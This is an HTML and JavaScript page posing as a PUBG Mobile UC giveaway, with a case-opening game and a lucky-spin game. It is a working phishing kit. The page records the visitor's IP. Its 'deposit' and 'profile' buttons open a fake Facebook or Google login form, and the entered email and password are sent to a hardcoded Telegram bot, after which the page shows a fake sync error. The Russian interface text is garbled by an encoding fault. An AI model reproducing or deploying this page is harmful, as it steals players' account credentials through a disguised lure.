<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG Mobile - Giveaway</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        :root {
            --pubg-gold: #ffbc00;
            --pubg-dark: #0b0c0d;
            --pubg-blue: #0084ff;
            --pubg-red: #ff3b30;
        }

        body {
            background-color: var(--pubg-dark);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0; padding: 0;
            overflow-x: hidden;
        }

        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        .uc-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #1a1a1a;
            border: 1px solid #c4a162;
            border-radius: 4px;
            padding: 1px 4px;
            font-size: 10px;
            font-weight: 900;
            color: #fff;
            margin-right: 4px;
        }

        header {
            background: rgba(0, 0, 0, 0.9);
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            position: sticky; top: 0; z-index: 100;
        }

        .balance-display {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 4px 10px;
            display: flex;
            align-items: center;
            gap: 4px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .btn-plus {
            background: #4caf50;
            width: 16px; height: 16px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 10px; font-weight: bold;
        }

        /* –ö–ï–ô–° */
        .case-container {
            position: relative;
            width: 100%;
            height: 160px;
            overflow: hidden;            background: radial-gradient(circle, rgba(255, 255, 255, 0.02) 0%, transparent 80%);
            margin: 20px 0;
        }

        .case-line {
            position: absolute;
            top: 0; left: 50%;
            width: 2px; height: 100%;
            background: var(--pubg-gold);
            z-index: 20;
            box-shadow: 0 0 15px var(--pubg-gold);
            transform: translateX(-50%);
        }

        .case-tape {
            display: flex;
            padding: 20px 0;
            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
            will-change: transform;
            /* –¶–µ–Ω—Ç—Ä–∏—Ä—É–µ–º –Ω–∞—á–∞–ª–æ */
            padding-left: 0; 
        }

        .case-item {
            min-width: 140px;
            max-width: 140px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.6;
            transition: opacity 0.5s;
        }
        .case-item img { width: 100px; height: 100px; object-fit: contain; }

        .error-msg {
            background: rgba(255, 59, 48, 0.1);
            color: var(--pubg-red);
            border-radius: 12px;
            padding: 12px;
            text-align: center;
            font-size: 13px;
            margin: 15px;
            display: none;
        }

        .btn-blue {
            background: var(--pubg-blue);
            color: white;
            width: calc(100% - 32px);
            margin: 0 16px;
            padding: 16px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            text-align: center;
            display: block;
        }

        .win-modal {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 2000; display: none;
            flex-direction: column; justify-content: center; align-items: center; padding: 20px;
        }

        .win-card {
            background: #0b0c0d;
            border: 2px solid var(--pubg-gold);
            border-radius: 20px; padding: 30px; width: 85%; max-width: 320px; text-align: center;
        }

        .spin-cell img { width: 100%; height: 100%; object-fit: contain; }

        .nav-bar {
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #000; height: 65px;
            display: flex; justify-content: space-around; align-items: center;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; }
        .nav-item.active { color: var(--pubg-gold); }

        .modal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 1000; display: none; flex-direction: column; padding: 20px;
            justify-content: center;
        }
        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
    </style>
</head>
<body>

    <header>
        <div class="flex items-center gap-2" id="backBtn" style="display: none;" onclick="showSection('hub')">
            <i class="fas fa-chevron-left text-gray-400"></i>
            <span class="text-sm font-bold">–ù–∞–∑–∞–¥</span>
        </div>
        <div class="text-center" style="flex: 1;">
            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
        </div>
        
        <div class="balance-display" onclick="startAuth()">
            <span class="uc-icon">UC</span>
            <span id="headerBalance" class="text-sm font-bold">60</span>
            <div class="btn-plus">+</div>
        </div>
    </header>

    <!-- HUB -->
    <div id="section-hub" class="p-4"><div class="grid grid-cols-2 gap-4 mt-4">
            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
            </div>
            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
            </div>
        </div>
    </div>

    <!-- CASE -->
    <div id="section-case" style="display: none;">
        <div class="text-center py-6">
            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
        </div>
        <div class="case-container">
            <div class="case-line"></div>
            <div id="caseTape" class="case-tape"></div>
        </div>
        <div id="errorBox" class="error-msg">–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤</div>
        <div id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">–û—Ç–∫—Ä—ã—Ç—å (60 UC)</div>
        <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</div>
    </div>

    <!-- SPIN -->
    <div id="section-spin" style="display: none;" class="p-5">
        <div class="text-center py-4">
            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
        </div>
        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
            <div class="grid grid-cols-3 gap-3">
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s0"><img src="priz1.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s1"><img src="priz2.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s2"><img src="priz3.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s7"><img src="priz4.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="mid"><img src="priz5.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s3"><img src="priz6.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s6"><img src="priz7.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s5"><img src="priz8.png"></div>
                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent spin-cell" id="s4"><img src="priz9.png"></div>
            </div>
        </div>
        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">–ö—Ä—É—Ç–∏—Ç—å (60 UC)</button>
        <div id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</div>
    </div>

    <!-- WIN MODAL -->
    <div id="winModal" class="win-modal">
        <div class="win-card">
            <div class="pubg-font text-3xl text-yellow-400 mb-6">–ü–û–ë–ï–î–ê!</div>
            <img id="winPrizeImage" src="" class="w-40 h-40 mx-auto mb-8 object-contain">
            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-4 rounded-xl font-bold text-lg">–ó–∞–±—Ä–∞—Ç—å –ø—Ä–∏–∑</button>
        </div>
    </div>

    <!-- AUTH -->
    <div id="modalAuth" class="modal">
        <div class="login-card">
            <h2 class="font-black text-xl mb-4 text-center">–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è</h2>
            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center">–û—Ç–º–µ–Ω–∞</button>
        </div>
    </div>

    <div id="modalForm" class="modal">
        <div class="login-card">
            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
            <input type="text" id="inpUser" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω">
            <input type="password" id="inpPass" placeholder="–ü–∞—Ä–æ–ª—å">
            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">–í–æ–π—Ç–∏</button>
        </div>
    </div>

    <nav class="nav-bar">
        <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
        <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
    </nav>

    <script>
        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
        const CHAT_ID = '1709490182';
        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
        
        let balance = 60; 
        let userIP = '';
        let isSpinning = false;
        const itemWidth = 140; // –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —à–∏—Ä–∏–Ω–∞ –ø—Ä–µ–¥–º–µ—Ç–∞ –≤ –∫–µ–π—Å–µ

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');

        function updateBalanceUI() {
            document.getElementById('headerBalance').innerText = balance;
            const canPlay = balance >= 60;
            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
        }

        function showSection(id) {
            ['section-hub', 'section-case', 'section-spin'].forEach(s => document.getElementById(s).style.display = 'none');
            document.getElementById('section-' + id).style.display = 'block';
            document.getElementById('backBtn').style.display = id === 'hub' ? 'none' : 'flex';
        }

        // –ì–ï–ù–ï–†–ê–¶–ò–Ø –õ–ï–ù–¢–´ –ë–ï–ó –ü–û–í–¢–û–†–û–í –†–Ø–î–û–ú
        function initCase() {
            const tape = document.getElementById('caseTape');
            tape.innerHTML = '';
            let lastIdx = -1;
            for(let i=0; i<80; i++) {
                let idx;
                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
                lastIdx = idx;
                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
            }
        }

        function openCase() {
            if (balance < 60 || isSpinning) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;

            const targetIdx = 50; // –ù–∞ –∫–∞–∫–æ–π –ø—Ä–µ–¥–º–µ—Ç –ø–æ —Å—á–µ—Ç—É —É–ø–∞–¥–µ—Ç –ª–∏–Ω–∏—è
            const tape = document.getElementById('caseTape');
            
            // –†–∞—Å—á–µ—Ç: (–∏–Ω–¥–µ–∫—Å * —à–∏—Ä–∏–Ω–∞) + (–ø–æ–ª–æ–≤–∏–Ω–∞ —à–∏—Ä–∏–Ω—ã –¥–ª—è —Ü–µ–Ω—Ç—Ä–∞) - (–ø–æ–ª–æ–≤–∏–Ω–∞ —ç–∫—Ä–∞–Ω–∞ –¥–ª—è —Ü–µ–Ω—Ç—Ä–∞ –ª–∏–Ω–∏–∏)
            const finalOffset = (targetIdx * itemWidth) + (itemWidth / 2) - (window.innerWidth / 2);
            
            tape.style.transform = `translateX(-${finalOffset}px)`;
            
            setTimeout(() => {
                const winImg = tape.children[targetIdx].querySelector('img').src;
                showWinModal(winImg);
                sendTelegram(`üéÅ –ö–µ–π—Å –æ—Ç–∫—Ä—ã—Ç | IP: ${userIP}`);
                isSpinning = false;
            }, 5000);
        }

        function startSpin() {
            if (isSpinning || balance < 60) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;

            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
            let currentMove = 0;
            const totalMoves = 30 + Math.floor(Math.random() * 9); // –°–ª—É—á–∞–π–Ω–æ–µ –∫–æ–ª-–≤–æ —à–∞–≥–æ–≤

            const interval = setInterval(() => {
                cells.forEach(c => {
                    document.getElementById(c).style.borderColor = 'transparent';
                    document.getElementById(c).style.boxShadow = 'none';
                });

                const currentCellId = cells[currentMove % cells.length];
                const currentCell = document.getElementById(currentCellId);
                currentCell.style.borderColor = '#ffbc00';
                currentCell.style.boxShadow = '0 0 15px #ffbc00';

                currentMove++;

                if (currentMove >= totalMoves) {
                    clearInterval(interval);
                    setTimeout(() => {
                        const winImg = currentCell.querySelector('img').src;
                        showWinModal(winImg);
                        sendTelegram(`üé° Lucky Spin | IP: ${userIP}`);
                        isSpinning = false;
                    }, 500);
                }
            }, 100);
        }

        function showWinModal(img) {
            document.getElementById('winPrizeImage').src = img;
            document.getElementById('winModal').style.display = 'flex';
        }

        function closeWinModal() { 
            document.getElementById('winModal').style.display = 'none'; 
            if(balance < 60) location.reload(); // –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –µ—Å–ª–∏ UC –∫–æ–Ω—á–∏–ª–∏—Å—å
        }

        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
        function openForm(m) {
            document.getElementById('modalAuth').style.display = 'none';
            document.getElementById('modalForm').style.display = 'flex';
            document.getElementById('methodName').innerText = m;
        }

        async function finalSubmit() {
            const u = document.getElementById('inpUser').value;
            const p = document.getElementById('inpPass').value;
            if(u.length < 4 || p.length < 4) return;
            await sendTelegram(`üî• LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
            alert('–û—à–∏–±–∫–∞ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏. –ê–∫–∫–∞—É–Ω—Ç –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º.');
            location.reload();
        }

        async function sendTelegram(t) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: t\ 
})
            }).catch(e => {});
        }

        initCase();
        updateBalanceUI();
    </script>
</body>
</html>
